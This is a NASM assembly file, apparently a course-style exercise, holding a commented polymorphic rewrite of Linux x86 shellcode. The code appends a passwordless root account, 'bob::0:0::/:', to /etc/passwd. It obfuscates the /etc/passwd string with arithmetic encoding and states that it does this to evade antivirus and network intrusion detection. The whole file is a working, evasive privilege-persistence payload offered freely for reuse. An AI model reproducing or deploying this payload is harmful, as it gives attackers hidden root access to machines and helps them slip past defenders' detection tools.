;  poly2.nasm( polymorphic rewrite)
;  commented disassembly of shellcode to add root user without password
;  downloaded fromhttp://www.shell-storm.org/shellcode/files/shellcode-548.php
;  original shellcode written by bob from dtors.net

;  a polymorphic version
;  that obfuscates portions of the code which may bypass NIDS/AV.  Original code
;  remains and is commented out to allow comparison.
;
;  May 6, 2013
;
; This program was re-written by John W. Pierce, CISSP.  I enter it into
; the public domain.  You are free to use and/or redistribute it without 
; restriction, though attribution would be the right thing to do.  I hope
; it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.
; 
; John W. Pierce, CISSP, remsanattexascarverdotcom

global	_start

_start:
section	.text

;
;      open, creat - open and possibly create a file or device
;      int open(const char *pathname, int flags);
;
xor    ebx,ebx		; zero out registers
push   ebx		; terminate string
; make the following something else so we don't trigger AV
;push   0x64777373
;push   0x61702f63
;push   0x74652f2f	; //etc/passwd

push 0x65787474		; these three have been xored with 0x1010101 to obfuscate (polymorphism)
push 0x62713064
push 0x75663030
mov	eax, 0x1010101
sub 	[esp + 8], eax
sub 	[esp + 4], eax
sub	[esp], eax	; polymorphic ends
mov    ebx,esp
xor    ecx,ecx
mov    cx,0x401		; flags
;xor    eax,eax		
;mov    al,0x5		; open
push	byte 0x5	; tightened up original code to save a byte
pop	eax
int    0x80
; returns fd or -1 for fail
	
;
;       write - write to a file descriptor
;       ssize_t write(int fd, const void *buf, size_t count);
;

mov    	ebx,eax		; fd in ebx
;push   	0x68732f6e	; sh/n
;push   0x69622f2f	; ib//, add 0x1010101
;mov   	eax, 0x6a633030
;sub	eax, 0x1010101	; translate back to normal
;push	eax		; ib//
push   	0x3a2f3a3a	; :/::
push   	0x303a303a	; 0:0:
push   	0x3a626f62	; :bob  all together => "bob::0:0::/:", don't
			; really need to specify shell
mov    	ecx,esp		; *buf
;xor    edx,edx
;mov    dl,0x14		; 20 bytes to write, no zero terminate necessary 
push	byte 0xc	; tightened up original code to save a byte, 12 bytes to write	
pop	edx
;xor    eax,eax		
;mov    al,0x4		; write
push	byte 0x4	; tightened up original code to save a byte
pop	eax
int    0x80
; returns number of bytes written or -1 for fail

;
;       close - close a file descriptor
;       int close(int fd);
;

;xor    eax,eax		; fd still in ebx
;mov    al,0x6		; close
push	byte 0x6	; tightened up original code to save a byte
pop	eax
int    0x80
; returns 0 on success

;
;       _exit, _Exit - terminate the calling process
;       void _exit(int status);
;

;xor    eax,eax		
;mov    al,0x1		
inc	eax		; assuming all is well, eax should be zero, save 3 bytes, segfault if assumption is wrong
int    0x80		; exit

